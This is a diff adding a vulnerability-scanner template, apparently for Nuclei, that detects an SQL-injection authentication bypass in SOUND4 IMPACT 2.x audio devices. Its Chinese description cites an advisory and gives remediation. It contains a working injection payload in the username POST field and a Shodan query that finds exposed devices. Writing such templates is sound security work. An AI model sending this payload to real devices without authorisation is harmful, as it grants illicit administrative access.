@@ -1,0 +1,37 @@
+id: sound4-impact-first-pulse-eco-2x-auth-bypass
+
+info:
+  name: SOUND4 IMPACT 2.x 认证绕过漏洞
+  author: r3Y3r53
+  severity: high
+  description: |
+    该应用存在SQL注入漏洞。'index.php' 中 'username' POST 参数在用于SQL查询前未经过充分过滤，攻击者可注入任意SQL代码，从而操纵SQL查询并绕过认证机制。
+  reference:
+    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5727.php
+  classification:
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.favicon.hash:-1548359600
+  tags: SOUND4-PULSE
+  remediation: >-
+    升级到已修复版本，并在服务端对每个受影响的操作和资源执行身份认证与授权检查。采用默认拒绝的访问控制策略，删除默认凭据，在可用时启用多因素认证，并限制管理端点的访问。
+
+http:
+  - raw:
+      - |
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=%27%2Bjoxvy--%2Bz&password=ffesdf
+    redirects: true
+    max-redirects: 2
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "Network Diagnostic:", "disconnect the user")'
+        condition: and
+        # digest: 4a0a004730450220754644c5dd01ff90bf2cb52c01e84031457f33d00928d986fd8f59c2608c7bd70221008a496053d8c980c94e4335994fe40b86d76aece66330394daea89af398b92fd8:922c64590222798bb761d5b6d8e72950
